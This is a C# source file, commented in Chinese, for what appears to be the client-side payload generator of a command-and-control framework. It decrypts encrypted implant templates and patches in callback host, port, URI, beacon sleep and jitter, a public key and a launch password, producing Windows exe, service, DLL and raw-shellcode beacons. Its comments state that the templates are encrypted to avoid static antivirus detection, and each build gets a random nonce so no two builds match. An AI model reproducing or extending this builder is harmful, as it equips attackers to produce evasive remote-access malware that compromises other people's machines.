using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace CsdevGui
{
    /// <summary>
    /// 客户端内置载荷生成器 (零外部工具链, 不需要 gcc / PowerShell / 服务端)。
    ///
    /// 原理与服务端 go/gen_native.go 的"内置生成器"完全一致:
    ///   1. 构建期已经把植入体编译成"模板"(tools/build_templates.ps1), 并以
    ///      AES-256-CBC 加密入库(避免明文载荷让 GUI 二进制被静态查杀)。
    ///   2. 生成时只做两件事: 内存里解密模板 -> 按偏移覆写一段 512 字节配置槽。
    ///   3. 配置槽布局与 kits/beacon/beacon2.c 的 C2_RUNTIME_CFG 逐字段对应。
    ///
    /// 于是客户端自己就能生成原生格式(win2-exe/console/svc/dll/raw/tcp)载荷,
    /// 不需要把生成请求打到服务端, 也不需要在生成机上安装 MinGW。
    ///
    /// 模板资源通过 csdev-gui.csproj 的 &lt;EmbeddedResource&gt; 从 ..\go\templates 挂载,
    /// 与服务端共用同一套模板, 保证两端产出的载荷语义一致。
    /// </summary>
    public static class NativeGenerator
    {
        // 配置槽定位标记: 必须与 beacon2.c 里 g_c2cfg.magic 的 8 字节逐字节一致
        private static readonly byte[] CfgMagic = { 0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C };

        // 配置槽布局 (镜像 go/gen_native.go 的常量表)
        private const int CfgSlotSize = 1024;
        private const int offVersion = 8;
        private const int offPort = 12;
        private const int offSleep = 16;
        private const int offJitter = 20;
        private const int offFlags = 24;
        private const int offNonce = 28;
        private const int offHost = 32;
        private const int lenHost = 128;
        private const int offURI = 160;
        private const int lenURI = 64;
        private const int offXform = 224;
        private const int lenXform = 32;
        private const int offTokenSalt = 256;
        private const int lenTokenSalt = 24;
        private const int offTokenHash = 280;
        private const int lenTokenHash = 72;
        private const int offIDHeader = 352;
        private const int lenIDHeader = 48;
        private const int offIDValue = 400;
        private const int lenIDValue = 80;
        private const int offPubkey = 480;
        private const int lenPubkey = 276;
        private const int offReserved = 756;
        private const int lenReserved = 268;
        private const int CfgVersion = 2;
        private const uint FlagSSL = 1u << 0;

        private static readonly string[] NativeFormatIds =
        {
            "win2-exe", "win2-console", "win2-svc", "win2-dll", "win2-raw", "win2-tcp"
        };

        /// <summary>某格式能否由本生成器产出 (客户端本地、零工具链)。</summary>
        public static bool Supports(string format)
        {
            if (string.IsNullOrEmpty(format)) return false;
            foreach (string id in NativeFormatIds)
            {
                if (string.Equals(id, format, StringComparison.OrdinalIgnoreCase)) return true;
            }
            return false;
        }

        /// <summary>原生格式列表 (与 Supports 一致)。</summary>
        public static IReadOnlyList<string> NativeFormats => NativeFormatIds;

        /// <summary>按格式推断默认扩展名 (镜像服务端 extOf)。</summary>
        public static string ExtOf(string format)
        {
            switch (format)
            {
                case "win2-exe":
                case "win2-console":
                case "win2-svc":
                case "win2-tcp":
                    return ".exe";
                case "win2-dll":
                    return ".dll";
                case "win2-raw":
                    return ".bin";
                default:
                    return ".bin";
            }
        }

        /// <summary>
        /// 构建一个原生载体 PE (供脚本类格式内嵌使用): 解密模板 -> 覆写配置槽(含公钥) -> 返回字节。
        /// </summary>
        public static byte[] BuildCarrier(string carrierFormat, string host, int port, bool ssl,
                                          string uri, int sleep, int jitter, string xform, string password,
                                          byte[] pubkey)
        {
            string salt = "", hash = "";
            string gateErr = MakeTokenGate(password, out salt, out hash);
            if (gateErr != null) throw new InvalidOperationException(gateErr);

            byte[] tmpl = LoadTemplate(carrierFormat);
            int slot = FindSlot(tmpl);
            if (slot < 0) throw new InvalidOperationException("模板里找不到配置槽定位标记");
            return PatchConfig(tmpl, slot, host, port, ssl, uri, sleep, jitter, xform, salt, hash, pubkey);
        }

        /// <summary>一次生成的结果。</summary>
        public sealed class Result
        {
            public byte[] Blob;
            public string Log;
            public string FileName;
            public string Sha256;
            public string Error;
            public bool Ok => Error == null;
        }

        /// <summary>
        /// 生成一个原生格式载荷。
        ///
        /// 参数语义与 GUI「载荷生成」页一致; password 非空时启用启动口令门控。
        /// </summary>
        public static Result Generate(string format, string host, int port, bool ssl,
                                      string uri, int sleep, int jitter, string xform, string password,
                                      byte[] pubkey)
        {
            try
            {
                if (!Supports(format))
                {
                    return new Result { Error = "格式 " + format + " 没有内置模板 (客户端本地生成仅覆盖原生格式)" };
                }

                string salt = "", hash = "";
                string gateErr = MakeTokenGate(password, out salt, out hash);
                if (gateErr != null)
                {
                    return new Result { Error = gateErr };
                }

                byte[] tmpl = LoadTemplate(format);
                int slot = FindSlot(tmpl);
                if (slot < 0)
                {
                    return new Result { Error = "模板里找不到配置槽定位标记 (模板可能不是由 tools/build_templates.ps1 生成的)" };
                }

                byte[] blob = PatchConfig(tmpl, slot, host, port, ssl, uri, sleep, jitter, xform, salt, hash, pubkey);

                var log = new StringBuilder();
                log.AppendLine("[*] 客户端内置生成器 (零外部工具链, 未经过服务端)");
                log.AppendLine("    格式   : " + format);
                log.AppendLine("    回连   : " + (ssl ? "https://" : "http://") + host + ":" + port + (string.IsNullOrEmpty(uri) ? "/submit" : uri));
                log.AppendLine("    心跳   : " + sleep + " ms, 抖动 " + jitter + "%");
                log.AppendLine(hash.Length > 0 ? "    门控   : 已启用启动口令 (明文不回显)" : "    门控   : 未启用 (直接运行)");

                using (var sha = SHA256.Create())
                {
                    byte[] sum = sha.ComputeHash(blob);
                    string hex = ByteToHex(sum);
                    string fn = format + "_" + host + "_" + port + ExtOf(format);
                    log.AppendLine("    产物   : " + blob.Length + " 字节, sha256 " + hex.Substring(0, 16));
                    log.AppendLine("[+] 生成完成");
                    return new Result
                    {
                        Blob = blob,
                        Log = log.ToString(),
                        FileName = fn,
                        Sha256 = hex
                    };
                }
            }
            catch (Exception ex)
            {
                return new Result { Error = ex.Message };
            }
        }

        // ---------------------------------------------------------------- 内部实现

        private static byte[] ReadResource(string logicalName)
        {
            var asm = typeof(NativeGenerator).Assembly;
            using (Stream s = asm.GetManifestResourceStream(logicalName))
            {
                if (s == null)
                {
                    throw new InvalidOperationException("缺少内嵌资源: " + logicalName
                        + " (csdev-gui.csproj 需把 ..\\go\\templates\\*.bin 挂为 EmbeddedResource)");
                }
                using (var ms = new MemoryStream())
                {
                    s.CopyTo(ms);
                    return ms.ToArray();
                }
            }
        }

        private static byte[] LoadTemplate(string format)
        {
            byte[] key = ReadResource("csdev.templates.key.bin");
            if (key.Length != 32)
            {
                throw new InvalidOperationException("模板密钥长度异常: " + key.Length + " (应为 32)");
            }
            byte[] raw = ReadResource("csdev.templates." + format + ".bin");
            return DecryptTemplate(raw, key);
        }

        // 模板加密格式: [16B 随机 IV][AES-256-CBC(PKCS7) 密文]
        private static byte[] DecryptTemplate(byte[] raw, byte[] key)
        {
            if (raw.Length < 32 || (raw.Length - 16) % 16 != 0)
            {
                throw new InvalidOperationException("模板密文长度非法: " + raw.Length);
            }
            byte[] iv = new byte[16];
            Array.Copy(raw, 0, iv, 0, 16);
            byte[] ct = new byte[raw.Length - 16];
            Array.Copy(raw, 16, ct, 0, ct.Length);

            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                using (var dec = aes.CreateDecryptor())
                {
                    byte[] pt = dec.TransformFinalBlock(ct, 0, ct.Length);
                    int n = pt[pt.Length - 1];
                    if (n < 1 || n > 16 || n > pt.Length)
                    {
                        throw new InvalidOperationException("模板解密失败 (填充非法): 密钥不匹配或文件损坏");
                    }
                    for (int i = pt.Length - n; i < pt.Length; i++)
                    {
                        if (pt[i] != n)
                        {
                            throw new InvalidOperationException("模板解密失败 (填充字节不一致): 密钥不匹配或文件损坏");
                        }
                    }
                    byte[] out_ = new byte[pt.Length - n];
                    Array.Copy(pt, 0, out_, 0, out_.Length);
                    return out_;
                }
            }
        }

        // 全文件恰好命中一次, 否则拒绝生成
        private static int FindSlot(byte[] b)
        {
            int found = -1;
            for (int i = 0; i + CfgMagic.Length <= b.Length; i++)
            {
                bool hit = true;
                for (int j = 0; j < CfgMagic.Length; j++)
                {
                    if (b[i + j] != CfgMagic[j]) { hit = false; break; }
                }
                if (!hit) continue;
                if (found >= 0)
                {
                    throw new InvalidOperationException(
                        string.Format("配置槽定位标记出现多次 (偏移 0x{0:X} 与 0x{1:X}), 拒绝生成", found, i));
                }
                found = i;
            }
            if (found < 0)
            {
                throw new InvalidOperationException("模板里找不到配置槽定位标记 (模板可能不是由 tools/build_templates.ps1 生成的)");
            }
            if (found + CfgSlotSize > b.Length)
            {
                throw new InvalidOperationException(
                    string.Format("配置槽超出文件尾 (偏移 0x{0:X} + {1} > 长度 {2})", found, CfgSlotSize, b.Length));
            }
            return found;
        }

        private static void PutStr(byte[] buf, int off, int size, string val, string field)
        {
            if (val == null) val = "";
            if (val.Length > size - 1)
            {
                throw new InvalidOperationException(
                    string.Format("字段 {0} 过长: {1} 字节, 上限 {2}", field, val.Length, size - 1));
            }
            for (int i = 0; i < size; i++) buf[off + i] = 0;
            byte[] vb = Encoding.ASCII.GetBytes(val);
            Array.Copy(vb, 0, buf, off, Math.Min(vb.Length, size - 1));
        }

        private static void PutU32(byte[] buf, int off, uint v)
        {
            buf[off] = (byte)(v & 0xFF);
            buf[off + 1] = (byte)((v >> 8) & 0xFF);
            buf[off + 2] = (byte)((v >> 16) & 0xFF);
            buf[off + 3] = (byte)((v >> 24) & 0xFF);
        }

        private static byte[] PatchConfig(byte[] tmpl, int slot, string host, int port, bool ssl,
                                          string uri, int sleep, int jitter, string xform,
                                          string salt, string hash, byte[] pubkey)
        {
            if (string.IsNullOrEmpty(host) || host.Length > 100 ||
                host.IndexOfAny(new[] { '\0', ' ', '\t', '\r', '\n' }) >= 0)
            {
                throw new InvalidOperationException("回连地址不合法");
            }
            if (port <= 0 || port > 65535) throw new InvalidOperationException("端口超出范围: " + port);
            if (sleep < 50) sleep = 50;
            if (sleep > 3600000) sleep = 3600000;
            if (jitter < 0) jitter = 0;
            if (jitter > 90) jitter = 90;
            if (string.IsNullOrEmpty(uri)) uri = "/submit";
            if (string.IsNullOrEmpty(xform)) xform = "raw";
            if (string.IsNullOrEmpty(salt) != string.IsNullOrEmpty(hash))
            {
                throw new InvalidOperationException("启动口令的盐与摘要必须同时提供");
            }

            byte[] out_ = new byte[tmpl.Length];
            Array.Copy(tmpl, out_, tmpl.Length);

            PutU32(out_, slot + offVersion, CfgVersion);
            PutU32(out_, slot + offPort, (uint)port);
            PutU32(out_, slot + offSleep, (uint)sleep);
            PutU32(out_, slot + offJitter, (uint)jitter);
            PutU32(out_, slot + offFlags, ssl ? FlagSSL : 0u);

            // 每次生成写随机 nonce: 同样配置也不会产生逐字节相同的产物
            byte[] nb = new byte[4];
            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(nb);
            Array.Copy(nb, 0, out_, slot + offNonce, 4);

            PutStr(out_, slot + offHost, lenHost, host, "回连地址");
            PutStr(out_, slot + offURI, lenURI, uri, "URI");
            PutStr(out_, slot + offXform, lenXform, xform, "变换链");
            PutStr(out_, slot + offTokenSalt, lenTokenSalt, salt, "口令盐");
            PutStr(out_, slot + offTokenHash, lenTokenHash, hash, "口令摘要");
            PutStr(out_, slot + offIDHeader, lenIDHeader, "", "metadata 头");
            PutStr(out_, slot + offIDValue, lenIDValue, "", "metadata 值");

            // 运行期公钥: 覆写进槽位, 让载荷与服务端私钥永远同源。
            if (pubkey != null && pubkey.Length > 0)
            {
                if (pubkey.Length > lenPubkey)
                {
                    throw new InvalidOperationException("公钥 blob 过长: " + pubkey.Length + " 字节, 上限 " + lenPubkey);
                }
                for (int i = 0; i < lenPubkey; i++) out_[slot + offPubkey + i] = 0;
                Array.Copy(pubkey, 0, out_, slot + offPubkey, pubkey.Length);
            }

            for (int i = slot + offReserved; i < slot + CfgSlotSize; i++) out_[i] = 0;

            return out_;
        }

        // 镜像服务端 makeTokenGate: 随机盐 + SHA256(盐||口令), 明文口令不落产物
        private static string MakeTokenGate(string password, out string salt, out string hash)
        {
            salt = "";
            hash = "";
            if (string.IsNullOrEmpty(password)) return null;
            if (password.Length < 4) return "口令太短 (至少 4 个字符)";
            if (password.IndexOfAny(new[] { ' ', '\t', '\r', '\n' }) >= 0)
                return "口令不能含空白字符 (植入体按空白切分命令行)";

            byte[] raw = new byte[8];
            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(raw);
            salt = ByteToHex(raw);

            using (var sha = SHA256.Create())
            {
                hash = ByteToHex(sha.ComputeHash(Encoding.UTF8.GetBytes(salt + password)));
            }
            return null;
        }

        private static string ByteToHex(byte[] b)
        {
            var sb = new StringBuilder(b.Length * 2);
            foreach (byte x in b) sb.Append(x.ToString("x2"));
            return sb.ToString();
        }
    }
}
